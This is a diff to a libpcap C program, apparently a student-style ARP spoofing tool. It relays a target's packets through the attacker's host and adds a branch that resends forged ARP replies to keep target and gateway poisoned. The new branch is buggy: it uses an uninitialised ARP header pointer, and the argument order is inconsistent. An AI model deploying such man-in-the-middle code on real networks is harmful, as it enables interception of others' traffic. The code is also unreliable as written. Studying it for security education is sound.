@@ -8,7 +8,7 @@
 #include "arp.h"
 
 int gett_mac(const u_char *packet, u_char *t_mac, u_char* t_ip);
-int packetrelay(pcap_t *pcd, u_char *packet, u_char *g_ip, u_char *s_mac, u_char *t_ip, u_char *t_mac, u_char *g_mac);
+int packetrelay(pcap_t *pcd, char *dev, u_char *packet, u_char *g_ip, u_char *s_mac, u_char *t_ip, u_char *t_mac, u_char *g_mac);
 int main(void){
     char *dev;
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -68,7 +68,7 @@ int main(void){
     else{
         while(1){
             packet = pcap_next(pcd, &hdr);
-            packetrelay(pcd, packet, g_ip, t_ip, s_mac, t_mac, g_mac);
+            packetrelay(pcd, dev, packet, g_ip, t_ip, s_mac, t_mac, g_mac);
         }
     }
     return 0;
@@ -99,7 +99,7 @@ int gett_mac(const u_char *packet, u_char * t_mac, u_char* t_ip){
     return 0;
 }
 
-int packetrelay(pcap_t *pcd, u_char *packet, u_char *g_ip, u_char *t_ip, u_char *s_mac, u_char *t_mac, u_char *g_mac){
+int packetrelay(pcap_t *pcd, char *dev, u_char *packet, u_char *g_ip, u_char *t_ip, u_char *s_mac, u_char *t_mac, u_char *g_mac){
     struct ether_header *etheh;
     struct ip *iph;
     u_char tip[IPSIZE], sip[IPSIZE];
@@ -122,6 +122,24 @@ int packetrelay(pcap_t *pcd, u_char *packet, u_char *g_ip, u_char *t_ip, u_char 
             memcpy(etheh->ether_shost, s_mac, MACASIZE);
             memcpy(etheh->ether_dhost, t_mac, MACASIZE);
             pcap_inject(pcd, packet, sizeof(struct ether_header) + ntohs(iph->ip_len));
+        }
+        else if (etheh->ether_type == ntohs(ETHERTYPE_ARP)){
+            struct ether_arp *arph;
+            cp = (struct ether_arp*)cp;
+            inet_ntop(AF_INET, &arph->arp_tpa, tip, sizeof(tip));
+            inet_ntop(AF_INET, &arph->arp_spa, sip, sizeof(sip));
+            if((!strcmp(sip, t_ip) && !strcmp(tip, g_ip)) || (!strcmp(sip, g_ip) && !strcmp(tip, t_ip))){
+                if((sendarprep(pcd ,dev, packet, g_ip, s_mac, t_ip, t_mac)) ==-1) {
+                    pcap_perror(pcd,0);
+                    pcap_close(pcd);
+                    exit(1);
+                };
+                if((sendarprep(pcd, dev, packet, t_ip, s_mac, g_ip, g_mac)) ==-1) {
+                    pcap_perror(pcd,0);
+                    pcap_close(pcd);
+                    exit(1);
+                };
+            }
         }
     }
 
